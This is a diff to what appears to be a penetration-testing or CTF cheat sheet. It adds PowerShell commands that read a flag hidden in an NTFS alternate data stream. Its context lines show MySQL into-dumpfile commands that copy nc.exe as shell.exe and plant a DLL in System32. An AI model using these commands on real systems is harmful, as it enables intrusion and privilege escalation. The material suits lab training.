@@ -954,6 +954,21 @@ select load_file('C:\\test\\nc.exe') into dumpfile 'C:\\test\\shell.exe';
 select load_file('C:\\test\\phoneinfo.dll') into dumpfile "C:\\Windows\\System32\\phoneinfo.dll";
 
 ```
+## proof.txt
+```bash
+# When we have a random txt file instead of proof.txt
+PS C:\Users\Administrator\Desktop> Get-Item -path hm.txt -stream *
+
+FileName: C:\Users\Administrator\Desktop\hm.txt
+
+Stream                   Length
+------                   ------
+:$DATA                       36
+root.txt                     34
+
+Get-Content -path hm.txt -stream root.txt
+```
+
 
 ### RDP
 ```bash
